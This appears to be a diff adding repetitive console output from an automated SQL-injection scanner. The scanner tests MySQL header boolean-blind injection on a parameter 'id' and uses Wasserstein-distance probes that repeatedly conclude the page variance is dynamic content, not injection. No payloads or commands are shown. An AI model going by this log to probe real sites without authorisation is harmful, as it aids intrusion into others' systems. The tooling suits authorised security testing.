+    [B-bool] [MySQL] 'id' req#560 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#561)
+[*] testing 'MySQL header boolean-blind' (param='id' req#643)
+    [B-bool] [MySQL] 'id' req#582 sim=0.516 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#562 sim=0.562 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#563)
+[*] testing 'MySQL header boolean-blind' (param='id' req#644)
+[*]    Wasserstein comparison probe (param='id' req#583)
+[*] testing 'MySQL header boolean-blind' (param='id' req#645)
+    [B-bool] [MySQL] 'id' req#584 sim=0.547 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#564 sim=0.453 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#565)
+[*] testing 'MySQL header boolean-blind' (param='id' req#646)
+[*]    Wasserstein comparison probe (param='id' req#585)
+[*] testing 'MySQL header boolean-blind' (param='id' req#647)
+    [B-bool] [MySQL] 'id' req#566 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#567)
+[*] testing 'MySQL header boolean-blind' (param='id' req#648)
+    [B-bool] [MySQL] 'id' req#586 sim=0.562 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#587)
+[*] testing 'MySQL header boolean-blind' (param='id' req#649)
+    [B-bool] [MySQL] 'id' req#568 sim=0.547 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#569)
+[*] testing 'MySQL header boolean-blind' (param='id' req#650)
+    [B-bool] [MySQL] 'id' req#588 sim=0.516 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#589)
+[*] testing 'MySQL header boolean-blind' (param='id' req#651)
+    [B-bool] [MySQL] 'id' req#570 sim=0.516 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#571)
+[*] testing 'MySQL header boolean-blind' (param='id' req#652)
+    [B-bool] [MySQL] 'id' req#572 sim=0.516 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#590 sim=0.453 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#591)
+[*] testing 'MySQL header boolean-blind' (param='id' req#653)
+[*]    Wasserstein comparison probe (param='id' req#573)
+[*] testing 'MySQL header boolean-blind' (param='id' req#654)
+    [B-bool] [MySQL] 'id' req#574 sim=0.531 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#575)
+[*] testing 'MySQL header boolean-blind' (param='id' req#655)
+    [B-bool] [MySQL] 'id' req#592 sim=0.438 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#593)
+[*] testing 'MySQL header boolean-blind' (param='id' req#656)
+    [B-bool] [MySQL] 'id' req#576 sim=0.453 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#577)
+[*] testing 'MySQL header boolean-blind' (param='id' req#657)
+    [B-bool] [MySQL] 'id' req#594 sim=0.453 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#595)
+[*] testing 'MySQL header boolean-blind' (param='id' req#658)
+    [B-bool] [MySQL] 'id' req#578 sim=0.516 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#579)
+[*] testing 'MySQL header boolean-blind' (param='id' req#659)
+    [B-bool] [MySQL] 'id' req#596 sim=0.516 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#580 sim=0.484 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#581)
+[*] testing 'MySQL header boolean-blind' (param='id' req#660)
+[*]    Wasserstein comparison probe (param='id' req#597)
+[*] testing 'MySQL header boolean-blind' (param='id' req#661)
+    [B-bool] [MySQL] 'id' req#598 sim=0.531 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#599)
+[*] testing 'MySQL header boolean-blind' (param='id' req#662)
+    [B-bool] [MySQL] 'id' req#582 sim=0.453 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#583)
+[*] testing 'MySQL header boolean-blind' (param='id' req#663)
+    [B-bool] [MySQL] 'id' req#600 sim=0.547 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#601)
+[*] testing 'MySQL header boolean-blind' (param='id' req#664)
+    [B-bool] [MySQL] 'id' req#584 sim=0.547 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#585)
+[*] testing 'MySQL header boolean-blind' (param='id' req#665)
+    [B-bool] [MySQL] 'id' req#602 sim=0.438 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#603)
+[*] testing 'MySQL header boolean-blind' (param='id' req#666)
+    [B-bool] [MySQL] 'id' req#586 sim=0.500 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#587)
+[*] testing 'MySQL header boolean-blind' (param='id' req#667)
+    [B-bool] [MySQL] 'id' req#588 sim=0.422 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#589)
+[*] testing 'MySQL header boolean-blind' (param='id' req#668)
+    [B-bool] [MySQL] 'id' req#604 sim=0.438 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#605)
+[*] testing 'MySQL header boolean-blind' (param='id' req#669)
+    [B-bool] [MySQL] 'id' req#606 sim=0.516 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#607)
+[*]   [Wasserstein] dist=0.6781 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6652 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL header boolean-blind' (param='id' req#670)
+    [B-bool] [MySQL] 'id' req#590 sim=0.453 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#591)
+[*] testing 'MySQL header boolean-blind' (param='id' req#671)
+    [B-bool] [MySQL] 'id' req#608 sim=0.516 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#609)
+[*] testing 'MySQL header boolean-blind' (param='id' req#672)
+    [B-bool] [MySQL] 'id' req#592 sim=0.438 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#593)
+[*] testing 'MySQL header boolean-blind' (param='id' req#673)
+    [B-bool] [MySQL] 'id' req#610 sim=0.547 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#611)
+[*] testing 'MySQL header boolean-blind' (param='id' req#674)
+    [B-bool] [MySQL] 'id' req#594 sim=0.500 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#595)
+[*] testing 'MySQL header boolean-blind' (param='id' req#675)
+    [B-bool] [MySQL] 'id' req#612 sim=0.453 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#613)
+[*] testing 'MySQL header boolean-blind' (param='id' req#676)
+    [B-bool] [MySQL] 'id' req#596 sim=0.531 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#597)
+[*] testing 'MySQL header boolean-blind' (param='id' req#677)
+    [B-bool] [MySQL] 'id' req#614 sim=0.531 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#615)
+[*] testing 'MySQL header boolean-blind' (param='id' req#678)
+    [B-bool] [MySQL] 'id' req#598 sim=0.484 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#599)
+[*] testing 'MySQL header boolean-blind' (param='id' req#679)
+    [B-bool] [MySQL] 'id' req#616 sim=0.500 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#617)
+[*] testing 'MySQL header boolean-blind' (param='id' req#680)
+    [B-bool] [MySQL] 'id' req#600 sim=0.500 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#618 sim=0.516 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#619)
+[*]   [Wasserstein] dist=0.6781 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6652 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL header boolean-blind' (param='id' req#681)
+[*]    Wasserstein comparison probe (param='id' req#601)
+[*] testing 'MySQL header boolean-blind' (param='id' req#682)
+    [B-bool] [MySQL] 'id' req#620 sim=0.453 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#602 sim=0.453 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#603)
+[*] testing 'MySQL header boolean-blind' (param='id' req#683)
+[*]    Wasserstein comparison probe (param='id' req#621)
+[*] testing 'MySQL header boolean-blind' (param='id' req#684)
+    [B-bool] [MySQL] 'id' req#604 sim=0.453 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#605)
+[*] testing 'MySQL header boolean-blind' (param='id' req#685)
+    [B-bool] [MySQL] 'id' req#622 sim=0.438 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#623)
+[*] testing 'MySQL header boolean-blind' (param='id' req#686)
+    [B-bool] [MySQL] 'id' req#606 sim=0.453 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#607)
+[*] testing 'MySQL header boolean-blind' (param='id' req#687)
+    [B-bool] [MySQL] 'id' req#624 sim=0.531 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#625)
+[*] testing 'MySQL header boolean-blind' (param='id' req#688)
+    [B-bool] [MySQL] 'id' req#626 sim=0.516 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#627)
+[*] testing 'MySQL header boolean-blind' (param='id' req#689)
+    [B-bool] [MySQL] 'id' req#608 sim=0.438 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#609)
+[*] testing 'MySQL header boolean-blind' (param='id' req#690)
+    [B-bool] [MySQL] 'id' req#628 sim=0.531 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#629)
+[*] testing 'MySQL header boolean-blind' (param='id' req#691)
+    [B-bool] [MySQL] 'id' req#610 sim=0.500 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#630 sim=0.500 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#631)
+[*]   [Wasserstein] dist=0.6781 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6652 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL header boolean-blind' (param='id' req#692)
+[*]    Wasserstein comparison probe (param='id' req#611)
+[*] testing 'MySQL header boolean-blind' (param='id' req#693)
+    [B-bool] [MySQL] 'id' req#632 sim=0.531 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#633)
+[*] testing 'MySQL header boolean-blind' (param='id' req#694)
+    [B-bool] [MySQL] 'id' req#612 sim=0.531 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#613)
+[*] testing 'MySQL header boolean-blind' (param='id' req#695)
+    [B-bool] [MySQL] 'id' req#634 sim=0.516 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#635)
+[*] testing 'MySQL header boolean-blind' (param='id' req#696)
+    [B-bool] [MySQL] 'id' req#614 sim=0.453 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#636 sim=0.438 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#637)
+[*] testing 'MySQL header boolean-blind' (param='id' req#697)
+[*]    Wasserstein comparison probe (param='id' req#615)
+[*] testing 'MySQL header boolean-blind' (param='id' req#698)
+    [B-bool] [MySQL] 'id' req#638 sim=0.531 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#639)
+[*] testing 'MySQL header boolean-blind' (param='id' req#699)
+    [B-bool] [MySQL] 'id' req#616 sim=0.438 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#617)
+[*] testing 'MySQL header boolean-blind' (param='id' req#700)
+    [B-bool] [MySQL] 'id' req#640 sim=0.500 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#641)
+[*] testing 'MySQL header boolean-blind' (param='id' req#701)
+    [B-bool] [MySQL] 'id' req#618 sim=0.516 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#619)
+[*] testing 'MySQL header boolean-blind' (param='id' req#702)
+    [B-bool] [MySQL] 'id' req#642 sim=0.531 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#620 sim=0.547 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#643)
+[*] testing 'MySQL header boolean-blind' (param='id' req#703)
+[*]    Wasserstein comparison probe (param='id' req#621)
+[*] testing 'MySQL header boolean-blind' (param='id' req#704)
+    [B-bool] [MySQL] 'id' req#622 sim=0.516 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#623)
+[*] testing 'MySQL header boolean-blind' (param='id' req#705)
+    [B-bool] [MySQL] 'id' req#644 sim=0.438 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#624 sim=0.500 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#645)
+[*] testing 'MySQL header boolean-blind' (param='id' req#706)
+[*]    Wasserstein comparison probe (param='id' req#625)
+[*] testing 'MySQL header boolean-blind' (param='id' req#707)
+    [B-bool] [MySQL] 'id' req#646 sim=0.438 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#647)
+[*] testing 'MySQL header boolean-blind' (param='id' req#708)
+    [B-bool] [MySQL] 'id' req#626 sim=0.438 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#627)
+[*] testing 'MySQL header boolean-blind' (param='id' req#709)
+    [B-bool] [MySQL] 'id' req#648 sim=0.453 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#649)
+[*] testing 'MySQL header boolean-blind' (param='id' req#710)
+    [B-bool] [MySQL] 'id' req#628 sim=0.438 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#629)
+[*] testing 'MySQL header boolean-blind' (param='id' req#711)
+    [B-bool] [MySQL] 'id' req#650 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#651)
+[*] testing 'MySQL header boolean-blind' (param='id' req#712)
+    [B-bool] [MySQL] 'id' req#630 sim=0.547 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#631)
+[*] testing 'MySQL header boolean-blind' (param='id' req#713)
+    [B-bool] [MySQL] 'id' req#652 sim=0.531 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#653)
+[*] testing 'MySQL header boolean-blind' (param='id' req#714)
+    [B-bool] [MySQL] 'id' req#632 sim=0.516 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#633)
+[*] testing 'MySQL header boolean-blind' (param='id' req#715)
+    [B-bool] [MySQL] 'id' req#654 sim=0.531 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#655)
+[*] testing 'MySQL header boolean-blind' (param='id' req#716)
+    [B-bool] [MySQL] 'id' req#634 sim=0.547 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#635)
+[*] testing 'MySQL header boolean-blind' (param='id' req#717)
+    [B-bool] [MySQL] 'id' req#656 sim=0.531 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#657)
+[*] testing 'MySQL header boolean-blind' (param='id' req#718)
+    [B-bool] [MySQL] 'id' req#636 sim=0.484 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#637)
+[*] testing 'MySQL header boolean-blind' (param='id' req#719)
+    [B-bool] [MySQL] 'id' req#658 sim=0.516 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#659)
+[*] testing 'MySQL header boolean-blind' (param='id' req#720)
+    [B-bool] [MySQL] 'id' req#638 sim=0.516 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#639)
+[*] testing 'MySQL header boolean-blind' (param='id' req#721)
+    [B-bool] [MySQL] 'id' req#660 sim=0.547 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#661)
+[*] testing 'MySQL header boolean-blind' (param='id' req#722)
+    [B-bool] [MySQL] 'id' req#640 sim=0.516 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#641)
+[*] testing 'MySQL header boolean-blind' (param='id' req#723)
+    [B-bool] [MySQL] 'id' req#662 sim=0.500 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#663)
+[*] testing 'MySQL header boolean-blind' (param='id' req#724)
+    [B-bool] [MySQL] 'id' req#642 sim=0.531 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#643)
+[*]   [Wasserstein] dist=0.6781 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6781 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL header boolean-blind' (param='id' req#725)
+    [B-bool] [MySQL] 'id' req#664 sim=0.484 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#665)
+[*] testing 'MySQL header boolean-blind' (param='id' req#726)
+    [B-bool] [MySQL] 'id' req#644 sim=0.453 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#645)
+[*] testing 'MySQL header boolean-blind' (param='id' req#727)
+    [B-bool] [MySQL] 'id' req#666 sim=0.531 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#667)
+[*] testing 'MySQL header boolean-blind' (param='id' req#728)
+    [B-bool] [MySQL] 'id' req#646 sim=0.531 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#647)
+[*] testing 'MySQL header boolean-blind' (param='id' req#729)
+    [B-bool] [MySQL] 'id' req#668 sim=0.438 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#669)
+[*] testing 'MySQL header boolean-blind' (param='id' req#730)
+    [B-bool] [MySQL] 'id' req#648 sim=0.516 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#649)
+[*] testing 'MySQL header boolean-blind' (param='id' req#731)
+    [B-bool] [MySQL] 'id' req#670 sim=0.516 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#671)
+[*] testing 'MySQL header boolean-blind' (param='id' req#732)
+    [B-bool] [MySQL] 'id' req#650 sim=0.516 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#651)
+[*] testing 'MySQL header boolean-blind' (param='id' req#733)
+    [B-bool] [MySQL] 'id' req#672 sim=0.531 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#673)
+[*] testing 'MySQL header boolean-blind' (param='id' req#734)
+    [B-bool] [MySQL] 'id' req#652 sim=0.516 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#653)
+[*] testing 'MySQL header boolean-blind' (param='id' req#735)
+    [B-bool] [MySQL] 'id' req#674 sim=0.516 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#675)
+[*] testing 'MySQL header boolean-blind' (param='id' req#736)
+    [B-bool] [MySQL] 'id' req#654 sim=0.531 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#655)
+[*]   [Wasserstein] dist=0.6781 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6781 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL header boolean-blind' (param='id' req#737)
+    [B-bool] [MySQL] 'id' req#676 sim=0.562 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#677)
+[*] testing 'MySQL header boolean-blind' (param='id' req#738)
+    [B-bool] [MySQL] 'id' req#656 sim=0.438 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#657)
+[*]   [Wasserstein] dist=0.6651 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6651 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL header boolean-blind' (param='id' req#739)
+    [B-bool] [MySQL] 'id' req#678 sim=0.516 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#679)
+[*] testing 'MySQL header boolean-blind' (param='id' req#740)
+    [B-bool] [MySQL] 'id' req#658 sim=0.531 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#659)
+[*]   [Wasserstein] dist=0.6781 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6651 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL header boolean-blind' (param='id' req#741)
+    [B-bool] [MySQL] 'id' req#680 sim=0.547 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#681)
+[*] testing 'MySQL header boolean-blind' (param='id' req#742)
+    [B-bool] [MySQL] 'id' req#660 sim=0.547 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#661)
+[*]   [Wasserstein] dist=0.6781 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6651 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL header boolean-blind' (param='id' req#743)
+    [B-bool] [MySQL] 'id' req#682 sim=0.531 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#683)
+[*] testing 'MySQL header boolean-blind' (param='id' req#744)
+    [B-bool] [MySQL] 'id' req#662 sim=0.531 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#663)
+[*]   [Wasserstein] dist=0.6781 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6651 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL header boolean-blind' (param='id' req#745)
+    [B-bool] [MySQL] 'id' req#684 sim=0.547 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#685)
+[*] testing 'MySQL header boolean-blind' (param='id' req#746)
+    [B-bool] [MySQL] 'id' req#664 sim=0.547 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#665)
+[*]   [Wasserstein] dist=0.6781 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6651 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL header boolean-blind' (param='id' req#747)
+    [B-bool] [MySQL] 'id' req#686 sim=0.516 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#687)
+[*] testing 'MySQL header boolean-blind' (param='id' req#748)
+    [B-bool] [MySQL] 'id' req#666 sim=0.531 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#667)
+[*]   [Wasserstein] dist=0.6781 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6781 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL header boolean-blind' (param='id' req#749)
+    [B-bool] [MySQL] 'id' req#688 sim=0.531 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#689)
+[*] testing 'MySQL header boolean-blind' (param='id' req#750)
+    [B-bool] [MySQL] 'id' req#668 sim=0.531 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#669)
+[*] testing 'MySQL header boolean-blind' (param='id' req#751)
+    [B-bool] [MySQL] 'id' req#690 sim=0.531 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#691)
+[*] testing 'MySQL header boolean-blind' (param='id' req#752)
+    [B-bool] [MySQL] 'id' req#670 sim=0.547 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#671)
+[*] testing 'MySQL header boolean-blind' (param='id' req#753)
+    [B-bool] [MySQL] 'id' req#692 sim=0.547 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#693)
+[*] testing 'MySQL header boolean-blind' (param='id' req#754)
+    [B-bool] [MySQL] 'id' req#672 sim=0.516 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#673)
+[*] testing 'MySQL header boolean-blind' (param='id' req#755)
+    [B-bool] [MySQL] 'id' req#694 sim=0.500 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#695)
+[*] testing 'MySQL header boolean-blind' (param='id' req#756)
+    [B-bool] [MySQL] 'id' req#674 sim=0.531 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#675)
+[*] testing 'MySQL header boolean-blind' (param='id' req#757)
+    [B-bool] [MySQL] 'id' req#696 sim=0.562 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#697)
+[*] testing 'MySQL header boolean-blind' (param='id' req#758)
+    [B-bool] [MySQL] 'id' req#676 sim=0.500 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#677)
+[*] testing 'MySQL header boolean-blind' (param='id' req#759)
+    [B-bool] [MySQL] 'id' req#698 sim=0.516 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#699)
+[*] testing 'MySQL header boolean-blind' (param='id' req#760)
+    [B-bool] [MySQL] 'id' req#678 sim=0.547 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#700 sim=0.531 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#679)
+[*] testing 'MySQL header boolean-blind' (param='id' req#761)
+[*]    Wasserstein comparison probe (param='id' req#701)
+[*] testing 'MySQL header boolean-blind' (param='id' req#762)
+    [B-bool] [MySQL] 'id' req#680 sim=0.453 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#681)
+[*] testing 'MySQL header boolean-blind' (param='id' req#763)
+    [B-bool] [MySQL] 'id' req#702 sim=0.453 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#703)
+[*] testing 'MySQL header boolean-blind' (param='id' req#764)
+    [B-bool] [MySQL] 'id' req#682 sim=0.531 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#683)
+[*] testing 'MySQL header boolean-blind' (param='id' req#765)
+    [B-bool] [MySQL] 'id' req#704 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#705)
+[*] testing 'MySQL header boolean-blind' (param='id' req#766)
+    [B-bool] [MySQL] 'id' req#684 sim=0.453 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#685)
+[*] testing 'MySQL header boolean-blind' (param='id' req#767)
+    [B-bool] [MySQL] 'id' req#706 sim=0.547 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#707)
+[*] [diag] _try_technique: tech=BH dbms=MySQL templates=3181 → testing 636 payloads
+[*] testing 'MySQL header boolean-blind' (param='id' req#768)
+    [B-bool] [MySQL] 'id' req#686 sim=0.531 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#687)
+[*] testing 'MySQL header boolean-blind' (param='id' req#769)
